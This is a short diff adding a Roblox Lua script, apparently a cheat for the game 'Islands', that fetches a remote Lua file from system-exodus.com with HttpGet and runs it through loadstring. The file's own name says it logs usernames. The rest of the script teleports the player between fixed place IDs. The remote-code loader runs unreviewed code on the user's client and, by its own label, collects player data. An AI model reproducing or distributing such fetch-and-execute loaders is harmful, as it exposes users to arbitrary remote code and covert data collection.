@@ -1,0 +1,18 @@
+spawn (function()
+loadstring(game:HttpGet("https://system-exodus.com/scripts/Islands/thisdoeslogusernamesbtw.lua", true))()
+end)
+
+spawn (function()
+    local TpService = game:GetService("TeleportService")
+    local player = game.Players.LocalPlayer
+    
+    if game.placeId == 4872321990 then
+    wait()
+        game:GetService("TeleportService"):Teleport(5899156129,game.Players.LocalPlayer)
+    end
+
+    if game.placeId == 5899156129 then
+    wait(3600)
+        TpService:Teleport(7620160503,player)
+    end
+end)
